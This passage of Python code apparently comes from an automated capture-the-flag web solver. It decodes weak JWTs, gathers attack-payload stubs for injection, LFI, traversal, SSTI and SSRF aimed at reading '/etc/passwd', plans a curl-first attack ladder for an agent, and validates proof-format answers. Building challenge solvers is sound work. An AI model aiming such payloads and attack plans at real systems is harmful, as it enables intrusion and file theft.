    # 2026-10-21 (hs-unique-21): offline web_kit wiring. For each JWT already surfaced, if it is a known 'none' / weak-HS256 pattern, carry its header/payload as a structured fact; add payload stubs
    # for the common OWASP categories so an agent sees them without needing to assemble by hand. Pure offline; no network, no execution.
    try:
        import web_kit as _WK
        if fw["jwts"]:
            kit = []
            for j in fw["jwts"][:3]:
                tok = j.get("token") if isinstance(j, dict) else None
                if isinstance(tok, str) and tok.count(".") == 2:
                    try:
                        h, p, _ = _WK.jwt_decode(tok)
                        kit.append({"header": h, "payload": p})
                    except Exception:
                        continue
            if kit:
                facts["web_kit_jwt_decoded"] = kit[:3]
        # offline attack-payload stubs for the OWASP categories we recognise
        kit_payloads = {}
        for cat in ("cmdi", "lfi", "traversal", "ssti", "sqli", "ssrf"):
            try:
                p = _WK.payloads(cat, osname="nix", read="/etc/passwd", depth=3)
                if p:
                    kit_payloads[cat] = p[:3]
            except Exception:
                continue
        if kit_payloads:
            facts["web_kit_payload_hints"] = kit_payloads
    except Exception:
        pass
    # the deterministic SOLVING MACHINE (web_solve engine + web_solvers dispatcher, integrated 2026-10-17): surface the
    # curl-first attack ladder for THIS challenge (triage is OFFLINE - it only plans, no request fires here) and point
    # agent-6 at the entrypoint. The agent runs web_solvers.solve(ctx) live when it owns the attempt; static-only, the
    # solver never executes a downloaded sample. Lazy import so autosolve_web has no import cycle with web_solvers.
    try:
        import web_solve as _ws
        st = task or {}
        target = st.get("target") or st.get("url") or (st.get("statement") or {}).get("target")
        target = target if (isinstance(target, str) and target.startswith("http")) else None
        desc = st.get("description") or st.get("prompt") or (st.get("statement") or {}).get("text") or ""
        plan = _ws.triage({"description": desc, "source": (blobs or [None])[0], "target": target,
                           "answer_format": st.get("answer_format")})
        facts["web_attack_plan"] = [{"level": p["level"], "action": p["action"], "why": p.get("why", "")} for p in plan[:5]]
        facts["web_solver_entry"] = ("from web_solvers import solve; solve({description, target, source, answer_format, "
                                     "id_endpoint?, render_endpoint?, jwt?, auth?}) -> Finding(answer, provenance=exact "
                                     "curl, requests). CURL-FIRST recon/idor/auth/ssti/jwt, static-only, no sample executed.")
    except Exception:
        pass
    try:        # 2026-10-21 fix: read the stash populated by compute() instead of re-running analyse(); surfaces HELD, answered-by-family, AND an explicit parser/dependency error.
        import collections as _co
        _rec = last_web_contract_analysis(task)
        _status = _rec.get("status")
        _h2 = _rec.get("held") or {}
        _r2 = _rec.get("report") or {}
        _err = _rec.get("error")
        if _h2:
            facts["web_held"] = {"by_code": dict(_co.Counter(v["code"] for v in _h2.values())),
                                 "records": [{"id": k, "code": v["code"], "family": v.get("family"), "detail": str(v.get("detail"))[:120], "missing": v.get("missing_capability")} for k, v in list(_h2.items())[:12]]}
        if _r2:
            facts["web_answered_by"] = dict(_co.Counter(v["family"] for v in _r2.values()))
        if _err:                 # NEVER silently drop a dispatcher failure: the agent must see it
            facts["web_contract_error"] = _err
        if _status == "disabled":
            facts["web_contract_disabled"] = True
        # partial-answer visibility: how many of the ids the dispatcher resolved vs how many remained
        _ans = _rec.get("answers") or {}
        if _ans or _h2:
            facts["web_contract_summary"] = {"answered": len(_ans), "held": len(_h2), "status": _status}
    except Exception as _ex:
        facts["web_held_surface_error"] = {"type": type(_ex).__name__, "message": str(_ex)[:200]}
    missing = [a for a in ids if a not in answered]
    try:
        import re as _re_mk
        _proof_known = [a for a in ids if _re_mk.fullmatch(r"proof-\d+", str(a)) or str(a).endswith("_proof")]
        if _proof_known:
            prev = list(facts.get("known_ids") or [])
            facts["known_ids"] = sorted(set(prev) | set(_proof_known))
    except Exception:
        pass
    return {"facts": facts, "missing_tokens": missing, "expected_next": fw["notes"][:3]}


# D30 HS additions (2026-10-29): Luna gm.py submit-time proof-shape rule and the two Option Z kb files that WS banked at main @ a438b356. The validator rejects any non-proof answer BEFORE GM.submit so a solver that returned a hostname / case id / filename cannot cost a gate_blocked attempt (the D29 Trust the Build MM class). The family matcher + LFI candidate iterator read the kb files lazily and fail-open if either is missing (legacy generic probes still run). See challenges/_lib/kb/gm_web_bearer_flow.md and the kb/web_exploit_families.json schema for the universal rule and the five observed shapes.
import os as _os_hs
import re as _re_hs
PROOF_RE_HS = _re_hs.compile(r"^proof_[0-9a-f]{32}$")
_KB_DIR_HS = _os_hs.path.join(_os_hs.path.dirname(_os_hs.path.abspath(__file__)), "kb")
_FAMILIES_HS = None
_LFI_HS = None


def is_valid_web_proof(value):
    """Return True iff value matches the universal web Mastery answer shape proof_<32 hex>."""
    return bool(value and PROOF_RE_HS.fullmatch(str(value)))


def _load_families_hs():
    global _FAMILIES_HS
    if _FAMILIES_HS is not None:
        return _FAMILIES_HS
    try:
        with open(_os_hs.path.join(_KB_DIR_HS, "web_exploit_families.json"), encoding="utf-8") as f:
            _FAMILIES_HS = json.load(f)
    except Exception:
        _FAMILIES_HS = {"families": [], "_error": "web_exploit_families.json not loadable; falling back to generic probes"}
    return _FAMILIES_HS


def _load_lfi_hs():
    global _LFI_HS
    if _LFI_HS is not None:
        return _LFI_HS
    try:
        with open(_os_hs.path.join(_KB_DIR_HS, "web_lfi_candidates.json"), encoding="utf-8") as f:
            _LFI_HS = json.load(f)
    except Exception:
        _LFI_HS = {"candidates": [], "_error": "web_lfi_candidates.json not loadable"}
    return _LFI_HS


def match_family(target_body=None, robots_body=None):
    """Return the key of the first family whose fingerprints match the given target/robots bytes, or None. Fail-open: if no kb data is loaded, returns None and the caller falls through to generic probes."""
    doc = _load_families_hs()
    fams = doc.get("families") or []
    tb = (target_body or b"") if isinstance(target_body, (bytes, bytearray)) else (target_body or "").encode("utf-8", "ignore") if target_body else b""
    rb = (robots_body or b"") if isinstance(robots_body, (bytes, bytearray)) else (robots_body or "").encode("utf-8", "ignore") if robots_body else b""
    for fam in fams:
        fp = fam.get("fingerprints") or {}
        pat = fp.get("robots_pattern")
        if pat and rb and _re_hs.search(pat.encode("utf-8", "ignore"), rb):
            return fam.get("key")
        markers = fp.get("html_markers") or []
        if markers and tb and any(m.encode("utf-8", "ignore") in tb for m in markers):
            return fam.get("key")
    return None


def iter_lfi_candidates():
    """Yield (path, description, failed_markers) tuples for each known-good LFI document path, ordered by priority. Fail-open: empty list on load failure."""
    doc = _load_lfi_hs()
    for c in (doc.get("candidates") or []):
        yield (c.get("path"), c.get("description") or "", c.get("failed_markers") or [])


if __name__ == "__main__":
    data = open(sys.argv[1], "rb").read() if len(sys.argv) > 1 and not sys.argv[1].startswith("http") else None
    if data is not None:
        print(json.dumps(analyze(data), indent=1)[:2000])
    elif len(sys.argv) > 1:
        print(json.dumps(probe(sys.argv[1]), indent=1)[:2000])
